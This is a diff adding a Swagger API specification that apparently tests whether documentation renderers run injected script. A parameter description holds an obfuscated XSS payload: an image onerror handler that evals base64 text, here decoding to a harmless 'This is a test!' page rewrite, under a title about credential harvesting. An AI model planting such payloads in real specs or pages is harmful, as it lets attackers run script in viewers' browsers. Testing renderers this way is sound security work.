@@ -1,0 +1,40 @@
+swagger: '2.0'
+info:
+  title: XSS Credential Harvest
+  description: |
+    This is an XSS attack used to capture credentials.
+  version: v1
+basePath: /v1
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /credentials:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - Credential_Harvest
+      operationId: captureCredentials
+      summary: Capture user credentials
+  '/xss-inject/{id}':
+    delete:
+      parameters:
+        - description: |
+           <img src=x id="ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxjZW50ZXI+VGhpcyBpcyBhIHRlc3QhPC9jZW50ZXI+" onerror="eval(atob(this.id))">
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+
+
